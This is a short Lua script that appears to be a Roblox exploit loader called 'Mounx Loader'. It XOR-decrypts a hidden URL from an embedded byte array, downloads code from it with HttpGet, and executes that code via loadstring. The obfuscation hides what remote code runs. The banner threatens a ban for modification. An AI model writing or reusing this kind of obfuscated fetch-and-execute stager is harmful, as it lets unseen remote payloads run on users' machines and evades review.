-- Mounx Loader
-- Protected by Mounx Security Layer v3.2
-- Unauthorized modification will result in ban

local _s,_c,_b,_x,_tc = string,string.char,string.byte,bit32.bxor,table.concat
local _g = game

-- Runtime key derivation
local k={}
k[1]=_c(77)
k[2]=_c(120)
k[3]=_c(51)
k[4]=_c(53)
k[5]=_c(52)
k[6]=_c(48)
k[7]=_c(90)
k[8]=_c(107)
k[9]=_c(56)
k[10]=_c(56)
k[11]=_c(57)
k=_tc(k)

-- Encrypted payload
local e={37,12,71,69,71,10,117,68,85,87,76,35,0,67,84,90,85,54,69,87,86,75,40,22,87,80,70,30,57,4,85,23,88,61,17,28,89,91,81,62,14,74,23,73,56,26,95,92,87}

-- Decrypt
local d={}
for i=1,#e do
    d[i]=_c(_x(e[i],_b(k,((i-1)%#k)+1)))
end
d=_tc(d)

-- Execute
local f=_g["HttpGet"](_g,d)
if type(f)=="string" and #f>0 then
    local l=(loadstring or load)(f)
    if l then l() end
end
